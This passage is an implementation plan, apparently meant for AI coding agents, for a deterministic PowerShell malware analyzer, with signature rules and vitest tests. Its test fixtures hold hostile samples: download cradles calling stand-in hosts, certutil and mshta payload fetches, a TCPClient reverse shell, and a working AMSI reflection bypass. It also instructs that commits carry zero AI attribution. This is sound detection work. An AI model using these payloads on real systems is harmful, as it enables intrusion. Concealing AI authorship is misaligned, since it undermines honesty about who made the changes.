# PowerShell Analyzer — Phase 3 (Signature Catalog + Characterization) Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Give the `/analyzer` route a deterministic, MITRE-mapped technique-signal tally with co-occurrence weighting and a specificity-gated "high-confidence malicious" characterization, rendered as periwinkle technique chips — turning the Phase 1/2a *decoder* into the *analyzer* it was scoped to be.

**Architecture:** Add two pure, DOM-free modules under `shared/analyzer/` — `lolbins.ts` (a public-sources LOLBAS/binary fingerprint table + matcher) and `techniques.ts` (a declarative `SignatureRule` table + `RuleContext` + `runRules`/`classify` with a co-occurrence upgrade pass). `report.ts` builds a `RuleContext` from the decoded corpus, runs `classify`, derives the specificity-gated `Characterization`, and populates the already-declared `signals`/`characterization` fields on `AnalysisResult`. The UI adds one additive `'technique'` variant to the shared `Chip` and a new presentational `TechniqueTally` component, wired into the existing `PowerShellAnalyzer` route.

**Tech Stack:** TypeScript (strict), vitest (node env), React 18 + Tailwind v4 (web only). No new dependencies. No LLM. Never executes input.

**Spec:** `docs/superpowers/specs/2026-08-19-powershell-analyzer-design.md` (§6 signature catalog, §9 UI composition, §12 testing).

## Global Constraints

- **100% client-side, deterministic TypeScript in `shared/analyzer/`. No LLM in v1.** Same-input → same-output; no `Date.now()`/`Math.random()` in logic (only `checkedAt` may vary, already excluded from determinism tests).
- **Never executes the input.** No `eval`/`new Function`/dynamic dispatch. Rules are pure string/token pattern-matches. CSP (`script-src 'self'`, no `unsafe-eval`) forbids execution structurally — do not add anything that would need it.
- **No synthesized black-box verdict, no risk score.** Output is a technique-signal tally (count + specificity, each chip citing its triggering substring). Characterization is emitted **only** when a `near-dispositive` signal fires, and its prose is built **only** from the enumerated near-dispositive signals (`read ⊆ basis`).
- **Reserved-colour law** (`shared/ui/Chip.tsx`): technique signals render **periwinkle/neutral only**. Red/amber/green stay verdict-severity. The characterization headline is assertive but uses the **accent (periwinkle)** callout style — never red/amber/green.
- **Public sources only** (LOLBAS, public ATT&CK, public MS docs). No employer/CARL knowledge, no live fetch — `lolbins.ts`/`techniques.ts` are hand-authored committed constants.
- **Data boundary:** a pasted command never leaves the browser. No new network egress in this phase.
- **Rules match over the lexer's token stream, never raw regex on source.** The lexer already strips backtick obfuscation outside string literals (`` `A`m`s`i `` → bareword `Amsi`) — matching token *values* is what catches that; raw-text substring is a **fallback only**.
- **Commits:** `feat(analyzer): …` (or `test(analyzer):`) as SaltyCarl, **zero AI attribution**, no `Co-Authored-By`, no Claude references — anywhere, including commit bodies.
- **Test command** (run from `web/`): `npx vitest run ../shared/analyzer`. **Type gate** (from `web/`): `npx tsc -b`. There is **no `web/` browser-test harness** — UI tasks gate on tsc + `npm run build` + a dev-server dogfood screenshot, not Playwright.

---

## File Structure

**Create:**
- `shared/analyzer/lolbins.ts` — LOLBAS/binary fingerprint data table + `matchLolbin(ctx)`.
- `shared/analyzer/techniques.ts` — `SignatureRule`/`RuleHit` types, `buildContext`, match helpers, the `RULES` table, `runRules`, `classify` (co-occurrence upgrade).
- `shared/analyzer/__tests__/lolbins.test.ts`
- `shared/analyzer/__tests__/techniques.test.ts`
- `shared/analyzer/__tests__/characterization.test.ts`
- `web/src/components/analyzer/TechniqueTally.tsx` — the tally + characterization headline UI.

**Modify:**
- `shared/analyzer/types.ts` — add the `RuleContext` type (pure type; keeps the logic modules free of a cycle).
- `shared/analyzer/report.ts` — build context, run `classify`, derive characterization, populate result fields, extend `composeCopyText`.
- `shared/analyzer/index.ts` — export `classify`/`buildContext` (so tests and any future consumer reach them from the barrel).
- `shared/analyzer/__tests__/report.test.ts` — add signal/characterization/copyText assertions.
- `shared/ui/Chip.tsx` — add the `'technique'` variant (union + `VARIANT` + `DEFAULT_LABEL`).
- `web/src/routes/PowerShellAnalyzer.tsx` — render `<TechniqueTally>`.

**Boundaries.** `types.ts` stays pure types. `lolbins.ts` is data + one matcher, importing only the `RuleContext` type. `techniques.ts` owns all rule logic and imports the lexer + `lolbins`. `report.ts` orchestrates. The UI files are presentational and import only from the barrels.

---

### Task 1: LOLBin fingerprint table (`lolbins.ts`)

**Files:**
- Create: `shared/analyzer/lolbins.ts`
- Modify: `shared/analyzer/types.ts` (add `RuleContext`)
- Test: `shared/analyzer/__tests__/lolbins.test.ts`

**Interfaces:**
- Consumes: `RuleContext` (added to `types.ts` this task).
- Produces: `RuleContext` type; `LOLBINS: LolbinEntry[]`; `matchLolbin(ctx: RuleContext): { hit: boolean; trigger?: string; techniqueIds?: string[]; label?: string }`.

- [ ] **Step 1: Add `RuleContext` to `types.ts`**

Append to `shared/analyzer/types.ts` (after the existing `import` line add the token import; place the interface with the other interfaces):

```ts
import type { Token } from './lex'
```

```ts
/** The read-only context every signature rule matches against. Built once per
 *  analysis from the decoded corpus (all resolved layer texts) + the outer
 *  command-line evasion flags. `words` are lowercased bareword/string token
 *  values — the lexer has already stripped backtick obfuscation, so matching a
 *  word is literal-safe in a way a raw regex is not. `lower` is a whole-text
 *  fallback for multi-word phrases (e.g. decoy comments). */
export interface RuleContext {
  text: string           // decoded corpus (raw script + every resolved layer.text)
  lower: string          // text.toLowerCase()
  tokens: Token[]        // tokenize(text)
  words: string[]        // lowercased bareword + string token values
  flags: EvasionFlag[]   // outer command-line evasion flags from preprocess
}
```

- [ ] **Step 2: Write the failing test**

Create `shared/analyzer/__tests__/lolbins.test.ts`:

```ts
import { describe, expect, it } from 'vitest'
import { matchLolbin } from '../lolbins'
import { buildContext } from '../techniques'
import { preprocess } from '../preprocess'

function ctx(text: string, raw = text) {
  return buildContext(text, preprocess(raw).flags)
}

describe('matchLolbin', () => {
  it('hits certutil used as a downloader (-urlcache http)', () => {
    const r = matchLolbin(ctx("certutil.exe -urlcache -split -f http://45.9.148.20/a.exe a.exe"))
    expect(r.hit).toBe(true)
    expect(r.techniqueIds).toContain('T1105')
    expect(r.trigger?.toLowerCase()).toContain('certutil')
  })

  it('hits mshta launching a remote payload', () => {
    const r = matchLolbin(ctx("mshta http://evil.test/x.hta"))
    expect(r.hit).toBe(true)
    expect(r.techniqueIds).toContain('T1218.005')
  })

  it('does NOT hit certutil doing legitimate cert work (no URL / download verb)', () => {
    const r = matchLolbin(ctx("certutil -hashfile payload.bin SHA256"))
    expect(r.hit).toBe(false)
  })

  it('does NOT hit prose that merely mentions a binary name', () => {
    const r = matchLolbin(ctx("Write-Host 'run regsvr32 to register the dll'"))
    expect(r.hit).toBe(false)
  })
})
```

- [ ] **Step 3: Run the test to verify it fails**

Run (from `web/`): `npx vitest run ../shared/analyzer/__tests__/lolbins.test.ts`
Expected: FAIL — `matchLolbin`/`buildContext` not defined (`buildContext` arrives in Task 2; this test file also gates that import). It is acceptable for this file to stay red until Task 2 lands — note that and proceed; re-run at the end of Task 2.

- [ ] **Step 4: Write `lolbins.ts`**

Create `shared/analyzer/lolbins.ts`:

```ts
import type { RuleContext } from './types'

/** A LOLBAS/native binary that becomes suspicious ONLY in a download/exec form.
 *  `bin` is the binary name; `context` are the discriminators that separate the
 *  abusive form from benign use (a URL, an install/exec switch). A bare mention
 *  of `bin` never fires — one of `context` must co-occur. Public-sources only
 *  (lolbas-project.github.io + MS docs); hand-authored, no live fetch. */
export interface LolbinEntry {
  bin: string
  context: string[]      // at least one must co-occur with `bin`
  techniqueIds: string[]
}

export const LOLBINS: LolbinEntry[] = [
  { bin: 'certutil', context: ['-urlcache', '-verifyctl', 'http://', 'https://', '-decode', '-encode'], techniqueIds: ['T1105', 'T1140'] },
  { bin: 'bitsadmin', context: ['/transfer', '/addfile', 'http://', 'https://'], techniqueIds: ['T1105', 'T1197'] },
  { bin: 'mshta', context: ['http://', 'https://', 'javascript:', 'vbscript:', '.hta'], techniqueIds: ['T1218.005'] },
  { bin: 'regsvr32', context: ['/i:http', 'scrobj', '/u ', 'http://', 'https://'], techniqueIds: ['T1218.010'] },
  { bin: 'rundll32', context: ['javascript:', 'url.dll', 'shell32.dll', 'mshtml'], techniqueIds: ['T1218.011'] },
  { bin: 'msiexec', context: ['/i http', '/i https', '/q', '/package http'], techniqueIds: ['T1218.007'] },
  { bin: 'wmic', context: ['process call create', '/node:', 'format:http'], techniqueIds: ['T1047'] },
  { bin: 'installutil', context: ['/logfile', '/u ', '.exe'], techniqueIds: ['T1218.004'] },
  { bin: 'conhost', context: ['--headless'], techniqueIds: ['T1059.001'] },
]

/** Match the first LOLBin whose binary name AND at least one discriminator both
 *  appear in the decoded corpus. Returns a single hit (the highest-value one, in
 *  table order) — the rule layer renders it as one 'lolbin' signal naming the
 *  binary. Case-insensitive; substring over token values (literal-safe) with a
 *  whole-text fallback for phrase discriminators like 'process call create'. */
export function matchLolbin(ctx: RuleContext): { hit: boolean; trigger?: string; techniqueIds?: string[]; label?: string } {
  const present = (needle: string): boolean => {
    const k = needle.toLowerCase()
    return ctx.words.some((w) => w.includes(k)) || ctx.lower.includes(k)
  }
  for (const e of LOLBINS) {
    if (!present(e.bin)) continue
    if (!e.context.some(present)) continue
    return { hit: true, trigger: e.bin, techniqueIds: e.techniqueIds, label: `LOLBin: ${e.bin}` }
  }
  return { hit: false }
}
```

- [ ] **Step 5: Run the test (expect PASS after Task 2's `buildContext` exists)**

Run: `npx vitest run ../shared/analyzer/__tests__/lolbins.test.ts`
Expected: still FAIL until Task 2 exports `buildContext`. Confirm the failure is *only* the missing `buildContext` import (not a `lolbins` error). Proceed to Task 2; this test passes at Task 2 Step 6.

- [ ] **Step 6: Commit**

```bash
git add shared/analyzer/types.ts shared/analyzer/lolbins.ts shared/analyzer/__tests__/lolbins.test.ts
git commit -m "feat(analyzer): LOLBin fingerprint table with download/exec discriminators"
```

---

### Task 2: Rule engine foundation — context, helpers, first two rules, co-occurrence upgrade (`techniques.ts`)

**Files:**
- Create: `shared/analyzer/techniques.ts`
- Modify: `shared/analyzer/index.ts`
- Test: `shared/analyzer/__tests__/techniques.test.ts`

**Interfaces:**
- Consumes: `RuleContext`, `Signal`, `Specificity`, `EvasionFlag` (from `types.ts`); `tokenize`, `Token` (from `lex.ts`).
- Produces:
  - `RuleHit` = `{ hit: boolean; trigger?: string; techniqueIds?: string[]; label?: string }`
  - `SignatureRule` = `{ id: string; label: string; techniqueIds: string[]; baseSpecificity: Specificity; upgradesWith: string[]; test(ctx: RuleContext): RuleHit }`
  - `buildContext(text: string, flags: EvasionFlag[]): RuleContext`
  - `runRules(ctx: RuleContext): Signal[]`
  - `classify(ctx: RuleContext): Signal[]` (runRules + co-occurrence upgrade)
  - `RULES: SignatureRule[]` (extended by Tasks 3–5)

- [ ] **Step 1: Write the failing test**

Create `shared/analyzer/__tests__/techniques.test.ts`:

```ts
import { describe, expect, it } from 'vitest'
import { buildContext, classify } from '../techniques'
import { preprocess } from '../preprocess'

function analyze(text: string, raw = text) {
  return classify(buildContext(text, preprocess(raw).flags))
}
const ids = (text: string, raw = text) => analyze(text, raw).map((s) => s.id)
const specOf = (text: string, id: string, raw = text) =>
  analyze(text, raw).find((s) => s.id === id)?.specificity

describe('download cradle', () => {
  it('fires when fetched content flows into an interpreter', () => {
    const sigs = analyze("IEX (New-Object Net.WebClient).DownloadString('http://45.9.148.20/a.ps1')")
    const c = sigs.find((s) => s.id === 'download-cradle')
    expect(c).toBeTruthy()
    expect(c!.techniqueIds).toContain('T1105')
    expect(c!.trigger).toBeTruthy()
  })

  it('benign twin: download to a FILE (no IEX sink) does NOT fire', () => {
    expect(ids("Invoke-WebRequest https://example.com/data.json -OutFile data.json"))
      .not.toContain('download-cradle')
  })
})

describe('evasion-flag clustering', () => {
  it('fires on a 3+ evasion-flag cluster carrying an -enc payload', () => {
    const raw = "powershell -nop -w hidden -ep bypass -enc SQBFAFgA"
    expect(ids('IEX $x', raw)).toContain('evasion-cluster')
  })

  it('benign twin: evasion cluster running a LOCAL -File script does NOT fire', () => {
    const raw = "powershell -nop -w hidden -ExecutionPolicy Bypass -File C:\\ops\\backup.ps1"
    expect(ids('Get-ChildItem', raw)).not.toContain('evasion-cluster')
  })
})

describe('co-occurrence upgrade', () => {
  it('bumps evasion-cluster weak -> strong when a download cradle co-fires', () => {
    const raw = "powershell -nop -w hidden -ep bypass -enc AAAA"
    const script = "IEX (New-Object Net.WebClient).DownloadString('http://x.test/a')"
    expect(specOf(script, 'evasion-cluster', raw)).toBe('strong')
  })
})

describe('determinism / ordering', () => {
  it('returns signals in a stable rule order', () => {
    const a = ids("IEX (New-Object Net.WebClient).DownloadString('http://x.test/a')")
    const b = ids("IEX (New-Object Net.WebClient).DownloadString('http://x.test/a')")
    expect(a).toEqual(b)
  })
})
```

- [ ] **Step 2: Run the test to verify it fails**

Run: `npx vitest run ../shared/analyzer/__tests__/techniques.test.ts`
Expected: FAIL — `buildContext`/`classify` not defined.

- [ ] **Step 3: Write `techniques.ts` (foundation + two rules)**

Create `shared/analyzer/techniques.ts`:

```ts
import type { EvasionFlag, RuleContext, Signal, Specificity } from './types'
import { tokenize } from './lex'
import { matchLolbin } from './lolbins'

export interface RuleHit {
  hit: boolean
  trigger?: string
  techniqueIds?: string[]  // overrides the rule's static ids when a rule is data-driven (LOLBins)
  label?: string           // overrides the rule's static label (LOLBins name the binary)
}

export interface SignatureRule {
  id: string
  label: string
  techniqueIds: string[]
  baseSpecificity: Specificity
  upgradesWith: string[]   // companion rule ids: if any co-fires, bump this rule one tier
  test(ctx: RuleContext): RuleHit
}

/** Build the read-only match context once per analysis. `words` are lowercased
 *  bareword/string token values (backtick obfuscation already stripped by the
 *  lexer); `lower` is the whole-text fallback for multi-word phrases. */
export function buildContext(text: string, flags: EvasionFlag[]): RuleContext {
  const tokens = tokenize(text)
  const words = tokens
    .filter((t) => t.type === 'bareword' || t.type === 'string')
    .map((t) => t.value.toLowerCase())
  return { text, lower: text.toLowerCase(), tokens, words, flags }
}

// ---- match helpers (all case-insensitive; token-value first, whole-text fallback) ----

function present(ctx: RuleContext, needle: string): boolean {
  const k = needle.toLowerCase()
  return ctx.words.some((w) => w.includes(k)) || ctx.lower.includes(k)
}
function hasAll(ctx: RuleContext, needles: string[]): boolean {
  return needles.every((n) => present(ctx, n))
}
function hasAny(ctx: RuleContext, needles: string[]): boolean {
  return needles.some((n) => present(ctx, n))
}
function flagSet(ctx: RuleContext): Set<string> {
  return new Set(ctx.flags.map((f) => f.flag))
}
/** First token whose value contains any needle → its raw slice (audit trigger). */
function triggerFor(ctx: RuleContext, needles: string[]): string {
  for (const n of needles) {
    const k = n.toLowerCase()
    const tok = ctx.tokens.find(
      (t) => (t.type === 'bareword' || t.type === 'string') && t.value.toLowerCase().includes(k),
    )
    if (tok) return tok.raw.slice(0, 80)
  }
  return needles[0]
}

// Shared vocab.
const FETCH = ['downloadstring', 'downloaddata', 'downloadfile', 'invoke-webrequest', 'iwr', 'invoke-restmethod', 'irm', 'net.webclient', 'start-bitstransfer', 'httpclient', 'system.net.webrequest', 'wget', 'curl']
const OUTFILE = ['-outfile', '-out ', 'convertfrom-json', 'set-content', 'out-file']

/** IEX / Invoke-Expression / '&' call-operator sink present. `&` is a bareword
 *  to the lexer (not a punct), so it lands in `words`. */
function hasIexSink(ctx: RuleContext): boolean {
  return hasAny(ctx, ['iex', 'invoke-expression', '.invoke(']) || ctx.words.includes('&')
}

// ---- the rule table (extended by Tasks 3–5) ----

export const RULES: SignatureRule[] = [
  {
    id: 'download-cradle',
    label: 'download cradle',
    techniqueIds: ['T1059.001', 'T1105'],
    baseSpecificity: 'strong',
    upgradesWith: ['amsi-reflection', 'clickfix', 'evasion-cluster'],
    test(ctx) {
      const fetches = hasAny(ctx, FETCH)
      // Discriminator: fetched content must flow into an interpreter, not a file.
      if (fetches && hasIexSink(ctx)) return { hit: true, trigger: triggerFor(ctx, FETCH) }
      return { hit: false }
    },
  },
  {
    id: 'evasion-cluster',
    label: 'evasion flag cluster',
    techniqueIds: ['T1059.001', 'T1564.003', 'T1027'],
    baseSpecificity: 'weak',
    upgradesWith: ['download-cradle', 'amsi-reflection', 'clickfix'],
    test(ctx) {
      const flags = flagSet(ctx)
      const cluster = ['-enc', '-nop', '-w', '-ep', '-noni', '-sta'].filter((f) => flags.has(f)).length
      // Discriminator: a cluster is only suspicious with -enc or an inline fetch;
      // the same flags running a LOCAL -File automation are benign.
      const localFile = /-file\b/i.test(ctx.text) || present(ctx, '-file')
      const payload = flags.has('-enc') || hasAny(ctx, FETCH) || hasIexSink(ctx)
      if (cluster >= 3 && payload && !localFile) {
        return { hit: true, trigger: ctx.flags.map((f) => f.flag).join(' ') }
      }
      return { hit: false }
    },
  },
]

/** Run every rule once; emit one Signal per hit, in table order (deterministic).
 *  A rule's test may override label/techniqueIds (LOLBins are data-driven). */
export function runRules(ctx: RuleContext): Signal[] {
  const out: Signal[] = []
  for (const rule of RULES) {
    const r = rule.test(ctx)
    if (!r.hit) continue
    out.push({
      id: rule.id,
      label: r.label ?? rule.label,
      techniqueIds: r.techniqueIds ?? rule.techniqueIds,
      specificity: rule.baseSpecificity,
      trigger: r.trigger ?? rule.label,
    })
  }
  return out
}

const ORDER: Specificity[] = ['weak', 'strong', 'near-dispositive']
function bump(s: Specificity): Specificity {
  return ORDER[Math.min(ORDER.indexOf(s) + 1, ORDER.length - 1)]
}

/** Signals + co-occurrence upgrade: a rule whose `upgradesWith` names a
 *  companion that also fired is raised one specificity tier (capped at
 *  near-dispositive). Every single token has a benign twin — company is the
 *  accuracy mechanism. */
export function classify(ctx: RuleContext): Signal[] {
  const signals = runRules(ctx)
  const fired = new Set(signals.map((s) => s.id))
  const byId = new Map(RULES.map((r) => [r.id, r]))
  return signals.map((s) => {
    const rule = byId.get(s.id)
    if (rule && rule.upgradesWith.some((id) => fired.has(id))) {
      return { ...s, specificity: bump(s.specificity) }
    }
    return s
  })
}

// Re-exported so later rules (Tasks 3–5) and their tests can reuse the vocab/helpers.
export { hasAll, hasAny, present, flagSet, triggerFor, hasIexSink, FETCH, OUTFILE, matchLolbin }
```

- [ ] **Step 4: Export from the barrel**

Modify `shared/analyzer/index.ts`:

```ts
export { analyze } from './report'
export { classify, buildContext, runRules, RULES } from './techniques'
export { LOLBINS, matchLolbin } from './lolbins'
export type * from './types'
```

- [ ] **Step 5: Run the tests to verify they pass**

Run: `npx vitest run ../shared/analyzer/__tests__/techniques.test.ts ../shared/analyzer/__tests__/lolbins.test.ts`
Expected: PASS (both files — Task 1's test now resolves `buildContext`).

- [ ] **Step 6: Type gate**

Run (from `web/`): `npx tsc -b`
Expected: clean.

- [ ] **Step 7: Commit**

```bash
git add shared/analyzer/techniques.ts shared/analyzer/index.ts shared/analyzer/__tests__/techniques.test.ts shared/analyzer/__tests__/lolbins.test.ts
git commit -m "feat(analyzer): signature rule engine with co-occurrence upgrade (cradle + evasion cluster)"
```

---

### Task 3: AMSI / ETW / Defender tampering rules

**Files:**
- Modify: `shared/analyzer/techniques.ts` (append rules to `RULES`)
- Test: `shared/analyzer/__tests__/techniques.test.ts` (append `describe` blocks)

**Interfaces:**
- Consumes: the helpers/vocab exported from Task 2 (`hasAll`, `hasAny`, `triggerFor`).
- Produces: rule ids `amsi-reflection` (near-dispositive), `amsi-memory-patch` (near-dispositive), `etw-tamper` (strong), `defender-tamper` (strong) in `RULES`.

- [ ] **Step 1: Write the failing tests**

Append to `shared/analyzer/__tests__/techniques.test.ts`:

```ts
describe('AMSI / ETW / Defender tampering', () => {
  it('AMSI reflection patch is near-dispositive on its own', () => {
    const s = analyze("[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)")
    const a = s.find((x) => x.id === 'amsi-reflection')
    expect(a).toBeTruthy()
    expect(a!.specificity).toBe('near-dispositive')
  })

  it('AMSI memory patch (AmsiScanBuffer + VirtualProtect) is near-dispositive', () => {
    const s = analyze("$p = VirtualProtect $addr 0x1000 0x40 ([ref]$old); ... AmsiScanBuffer patch")
    expect(s.find((x) => x.id === 'amsi-memory-patch')?.specificity).toBe('near-dispositive')
  })

  it('Defender cmdlet tampering stays STRONG (installer/GPO benign twin exists)', () => {
    const s = analyze("Set-MpPreference -DisableRealtimeMonitoring $true")
    const d = s.find((x) => x.id === 'defender-tamper')
    expect(d).toBeTruthy()
    expect(d!.specificity).toBe('strong')
  })

  it('benign twin: a legitimate Add-MpPreference exclusion by itself is only STRONG, never near-dispositive', () => {
    const s = analyze("Add-MpPreference -ExclusionPath 'C:\\Program Files\\VendorApp'")
    const nd = s.filter((x) => x.specificity === 'near-dispositive')
    expect(nd).toHaveLength(0)
  })

  it('ETW tampering fires (strong)', () => {
    const s = analyze("[Reflection.Assembly]::Load(...); EtwEventWrite patched via reflection")
    expect(s.find((x) => x.id === 'etw-tamper')?.specificity).toBe('strong')
  })
})
```

- [ ] **Step 2: Run to verify failure**

Run: `npx vitest run ../shared/analyzer/__tests__/techniques.test.ts -t "AMSI"`
Expected: FAIL — rules not defined.

- [ ] **Step 3: Append the rules to `RULES`**

Insert these objects into the `RULES` array in `shared/analyzer/techniques.ts` (after `evasion-cluster`, before the closing `]`):

```ts
  {
    id: 'amsi-reflection',
    label: 'AMSI bypass via reflection',
    techniqueIds: ['T1562.001'],
    baseSpecificity: 'near-dispositive',
    upgradesWith: [],
    test(ctx) {
      // AmsiUtils + (amsiInitFailed | SetValue) reflection patch — zero benign use.
      if (hasAll(ctx, ['amsiutils']) && hasAny(ctx, ['amsiinitfailed', 'setvalue'])) {
        return { hit: true, trigger: triggerFor(ctx, ['amsiutils']) }
      }
      return { hit: false }
    },
  },
  {
    id: 'amsi-memory-patch',
    label: 'AMSI memory patch',
    techniqueIds: ['T1562.001', 'T1055'],
    baseSpecificity: 'near-dispositive',
    upgradesWith: [],
    test(ctx) {
      if (hasAll(ctx, ['amsiscanbuffer']) && hasAny(ctx, ['virtualprotect', 'writeprocessmemory'])) {
        return { hit: true, trigger: triggerFor(ctx, ['amsiscanbuffer']) }
      }
      return { hit: false }
    },
  },
  {
    id: 'etw-tamper',
    label: 'ETW tampering',
    techniqueIds: ['T1562.006'],
    baseSpecificity: 'strong',
    upgradesWith: ['amsi-reflection', 'fileless-loader'],
    test(ctx) {
      if (hasAny(ctx, ['etweventwrite', 'eventpipe', 'nttraceevent'])) {
        return { hit: true, trigger: triggerFor(ctx, ['etweventwrite', 'eventpipe', 'nttraceevent']) }
      }
      return { hit: false }
    },
  },
  {
    id: 'defender-tamper',
    label: 'Defender tampering',
    techniqueIds: ['T1562.001'],
    baseSpecificity: 'strong',
    upgradesWith: ['download-cradle', 'amsi-reflection', 'persistence'],
    test(ctx) {
      // Set/Add-MpPreference: installer collision → STRONG (needs corroboration),
      // not near-dispositive.
      if (hasAny(ctx, ['set-mppreference', 'add-mppreference']) &&
          hasAny(ctx, ['disablerealtimemonitoring', 'disableioavprotection', 'disablebehaviormonitoring', 'exclusionpath', 'exclusionextension', 'exclusionprocess'])) {
        return { hit: true, trigger: triggerFor(ctx, ['set-mppreference', 'add-mppreference']) }
      }
      return { hit: false }
    },
  },
```

- [ ] **Step 4: Run to verify pass**

Run: `npx vitest run ../shared/analyzer/__tests__/techniques.test.ts`
Expected: PASS (all blocks, including the earlier ones).

- [ ] **Step 5: Commit**

```bash
git add shared/analyzer/techniques.ts shared/analyzer/__tests__/techniques.test.ts
git commit -m "feat(analyzer): AMSI/ETW/Defender tampering signatures (reflection = near-dispositive)"
```

---

### Task 4: ClickFix, beaconing, reverse-shell, fileless-loader, persistence rules

**Files:**
- Modify: `shared/analyzer/techniques.ts` (append rules to `RULES`)
- Test: `shared/analyzer/__tests__/techniques.test.ts` (append blocks)

**Interfaces:**
- Consumes: Task 2 helpers/vocab + `flagSet`, `hasIexSink`.
- Produces: rule ids `clickfix` (strong), `beaconing` (strong), `reverse-shell` (near-dispositive), `fileless-loader` (strong), `persistence` (strong).

- [ ] **Step 1: Write the failing tests**

Append to `shared/analyzer/__tests__/techniques.test.ts`:

```ts
describe('ClickFix / paste-and-run', () => {
  it('fires on a hidden-window one-liner that fetches and IEXes', () => {
    const raw = "powershell -nop -w hidden -c IEX (iwr http://evil.test/x).Content"
    expect(ids('IEX (iwr http://evil.test/x).Content', raw)).toContain('clickfix')
  })
  it('fires on conhost --headless powershell', () => {
    expect(ids("conhost --headless powershell -nop -c iex(irm http://x.test/a)"))
      .toContain('clickfix')
  })
  it('benign twin: a plain hidden -File task does NOT fire', () => {
    const raw = "powershell -w hidden -nop -File C:\\ops\\job.ps1"
    expect(ids('Get-Date', raw)).not.toContain('clickfix')
  })
})

describe('beaconing + reverse shell + loaders + persistence', () => {
  it('beaconing: jittered sleep loop + same-host fetch', () => {
    expect(ids("while($true){ Start-Sleep (Get-Random -Min 30 -Max 90); IEX (New-Object Net.WebClient).DownloadString('http://c2.test/t') }"))
      .toContain('beaconing')
  })
  it('reverse-shell: TCPClient stream feeding IEX is near-dispositive', () => {
    const s = analyze("$c=New-Object Net.Sockets.TCPClient('10.0.0.5',4444);$s=$c.GetStream();IEX $data")
    expect(s.find((x) => x.id === 'reverse-shell')?.specificity).toBe('near-dispositive')
  })
  it('fileless-loader: VirtualAlloc + CreateThread on a byte array', () => {
    expect(ids("$b=[byte[]](0x90,0x90); $a=VirtualAlloc 0 $b.Length 0x3000 0x40; CreateThread 0 0 $a 0 0 0"))
      .toContain('fileless-loader')
  })
  it('persistence: Register-ScheduledTask fires (strong)', () => {
    const s = analyze("Register-ScheduledTask -TaskName Updater -Action $a -Trigger $t")
    expect(s.find((x) => x.id === 'persistence')?.specificity).toBe('strong')
  })
  it('benign twin: a bare Start-Sleep with no loop/fetch is not beaconing', () => {
    expect(ids("Start-Sleep -Seconds 5")).not.toContain('beaconing')
  })
})
```

- [ ] **Step 2: Run to verify failure**

Run: `npx vitest run ../shared/analyzer/__tests__/techniques.test.ts -t "ClickFix"`
Expected: FAIL — rules not defined.

- [ ] **Step 3: Append the rules to `RULES`**

Insert into the `RULES` array (after `defender-tamper`):

```ts
  {
    id: 'clickfix',
    label: 'ClickFix / paste-and-run',
    techniqueIds: ['T1204', 'T1059.001', 'T1218.005', 'T1105'],
    baseSpecificity: 'strong',
    upgradesWith: ['download-cradle', 'amsi-reflection'],
    test(ctx) {
      const flags = flagSet(ctx)
      const hiddenFetchIex = flags.has('-w') && flags.has('-nop') && hasAny(ctx, FETCH) && hasIexSink(ctx)
      const headless = hasAll(ctx, ['conhost', '--headless'])
      const hta = hasAny(ctx, ['mshta']) && hasAny(ctx, ['http://', 'https://', 'javascript:', '.hta'])
      const decoy = hasAny(ctx, ['verify you are human', 'i am not a robot', 'ray id', 'captcha', 'press win+r'])
      if (hiddenFetchIex || headless || hta || decoy) {
        return { hit: true, trigger: headless ? '--headless' : triggerFor(ctx, [...FETCH, 'mshta', 'captcha']) }
      }
      return { hit: false }
    },
  },
  {
    id: 'beaconing',
    label: 'beaconing / C2 loop',
    techniqueIds: ['T1071.001', 'T1571'],
    baseSpecificity: 'strong',
    upgradesWith: ['download-cradle', 'reverse-shell'],
    test(ctx) {
      const loop = hasAny(ctx, ['while']) && hasAny(ctx, ['start-sleep'])
      const talk = hasAny(ctx, FETCH) || hasAny(ctx, ['tcpclient', 'net.sockets', 'udpclient'])
      if (loop && talk) return { hit: true, trigger: triggerFor(ctx, ['start-sleep', 'while']) }
      return { hit: false }
    },
  },
  {
    id: 'reverse-shell',
    label: 'reverse shell',
    techniqueIds: ['T1059.001', 'T1071.001'],
    baseSpecificity: 'near-dispositive',
    upgradesWith: [],
    test(ctx) {
      // A raw socket whose stream feeds IEX — Nishang Invoke-PowerShellTcp style.
      // No legitimate PowerShell one-liner pipes a TCP stream into the interpreter.
      const socket = hasAny(ctx, ['tcpclient', 'net.sockets.tcpclient', 'invoke-powershelltcp'])
      if (socket && hasIexSink(ctx) && hasAny(ctx, ['getstream', 'read(', 'invoke-powershelltcp'])) {
        return { hit: true, trigger: triggerFor(ctx, ['tcpclient', 'invoke-powershelltcp']) }
      }
      return { hit: false }
    },
  },
  {
    id: 'fileless-loader',
    label: 'in-memory loader / shellcode',
    techniqueIds: ['T1055', 'T1620'],
    baseSpecificity: 'strong',
    upgradesWith: ['amsi-reflection', 'amsi-memory-patch', 'etw-tamper'],
    test(ctx) {
      const alloc = hasAny(ctx, ['virtualalloc', 'ntallocatevirtualmemory', '[reflection.assembly]::load', 'createthread', 'createremotethread'])
      const shell = hasAny(ctx, ['byte[]', '[byte[]]', 'marshal.copy', 'add-type', 'getdelegatefor'])
      if (alloc && shell) return { hit: true, trigger: triggerFor(ctx, ['virtualalloc', 'createthread', '[reflection.assembly]::load']) }
      return { hit: false }
    },
  },
  {
    id: 'persistence',
    label: 'persistence',
    techniqueIds: ['T1053.005', 'T1547.001', 'T1546.003'],
    baseSpecificity: 'strong',
    upgradesWith: ['download-cradle', 'amsi-reflection', 'clickfix'],
    test(ctx) {
      const p = hasAny(ctx, ['register-scheduledtask', 'schtasks', 'currentversion\\run', 'runonce', 'new-service', '__eventfilter', 'commandlineeventconsumer', 'startup\\'])
      if (p) return { hit: true, trigger: triggerFor(ctx, ['register-scheduledtask', 'schtasks', 'runonce', 'new-service']) }
      return { hit: false }
    },
  },
  {
    id: 'lolbin',
    label: 'LOLBin',
    techniqueIds: ['T1218'],
    baseSpecificity: 'strong',
    upgradesWith: ['download-cradle', 'clickfix'],
    test(ctx) {
      return matchLolbin(ctx)
    },
  },
```

Note: the `lolbin` rule delegates to `matchLolbin` (Task 1) and is included here so `RULES` is complete after this task. Its dedicated test lives in `lolbins.test.ts` (Task 1); confirm it surfaces via `classify` in Step 4.

- [ ] **Step 4: Add a lolbin-via-classify assertion**

